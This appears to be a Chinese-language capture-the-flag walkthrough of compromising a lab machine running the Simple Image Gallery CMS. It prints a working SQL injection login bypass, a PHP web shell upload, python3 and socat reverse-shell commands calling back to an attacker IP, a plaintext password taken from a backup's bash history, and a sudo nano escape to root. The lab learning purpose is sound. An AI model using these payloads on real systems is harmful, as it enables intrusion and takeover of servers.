# gallery

开启靶机，按规矩nmap扫一波

进入8080端口的web页面

看到是CMS, Simple Image Gallery

    searchsploit Simple Image Gallery

发现有rce漏洞

分析了一下exp，其实很简单

http://10.10.206.231/gallery/classes/Login.php?f=login

存在sqli漏洞，绕过登录进入后台后，存在任意文件上传漏洞，然后我们上传reverseshell，得到shell

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">curl</font> <font color="#9755B3">--url</font> <font color="#FEA44C">&apos;http://10.10.206.231/gallery/classes/Login.php?f=login&apos;</font> <font color="#9755B3">-X</font><font color="#FEA44C"> POST </font><font color="#9755B3">-H</font> <font color="#FEA44C">&apos;Content-Type: application/x-www-form-urlencoded&apos;</font> <font color="#9755B3">-d</font> <font color="#FEA44C">&quot;username=admin&apos; or 1=1%23&amp;password=123&quot;</font>
{&quot;status&quot;:&quot;success&quot;} </pre>

找到文件上传点，上传一句话

上传的文件在/gallery/uploads文件夹：

    http://10.10.206.231/gallery/uploads/user_1/album_2/1671002760.php/?cmd=whoami

python3 reverse shell:

    http://10.10.206.231/gallery/uploads/user_1/album_2/1671002760.php/?cmd=python3%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.11.17.14%22,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27

升级shell

    python3 -c "import pty;pty.spawn('/bin/bash')"


翻看/var/www/html，最终在initialize.php发现了登录数据库的用户名和密码

进入数据库获得admin的MD5密码，提交

到这里就没了，于是去找找有没有备份文件

在/var/backups下发现mike_home_backup文件夹，并存在.bash_history

读取该文件获得mike密码

    b3stpassw0rdbr0xx

登录查看sudo -l

可以运行bash /opt/rootkit.sh

rootkit.sh中可以运行nano ...file

首先升级一下shell

    攻击机：socat file:`tty`,raw,echo=0 tcp-listen:9999
    


    再次反弹shell:socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.11.17.14:9999

然后再次登录mike账号运行:

    sudo bash /opt/rootkit.sh

CTRL + R,  CTRL + X

    reset; sh 1>&0 2>&0

成功提权root
